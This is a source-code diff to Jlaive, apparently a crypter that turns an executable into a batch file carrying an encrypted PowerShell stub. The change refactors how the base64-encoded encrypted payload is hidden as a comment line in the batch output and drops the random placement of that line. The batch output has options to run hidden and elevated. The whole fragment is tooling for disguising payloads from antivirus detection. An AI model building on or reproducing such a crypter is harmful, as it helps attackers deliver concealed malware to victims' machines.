@@ -75,9 +75,7 @@ namespace Jlaive
             tabControl1.SelectedTab = tabControl1.TabPages["outputPage"];
             log.Items.Clear();
 
-            Random rng = new Random();
-            StubGen stubgen = new StubGen(_key, _iv, rng);
-
+            StubGen stubgen = new StubGen(_key, _iv);
             byte[] pbytes = File.ReadAllBytes(_input);
             bool isnetasm = IsAssembly(_input);
 
@@ -129,10 +127,7 @@ namespace Jlaive
             string pscommand = stubgen.CreatePS();
 
             log.Items.Add("Creating batch file...");
-            string content = stubgen.CreateBat(pscommand, hidden.Checked, runas.Checked);
-            List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
-            content_lines.Insert(rng.Next(0, content_lines.Count), ":: " + Convert.ToBase64String(stub_enc));
-            content = string.Join(Environment.NewLine, content_lines);
+            string content = stubgen.CreateBat(pscommand, stub_enc, hidden.Checked, runas.Checked);
 
             SaveFileDialog sfd = new SaveFileDialog()
             {
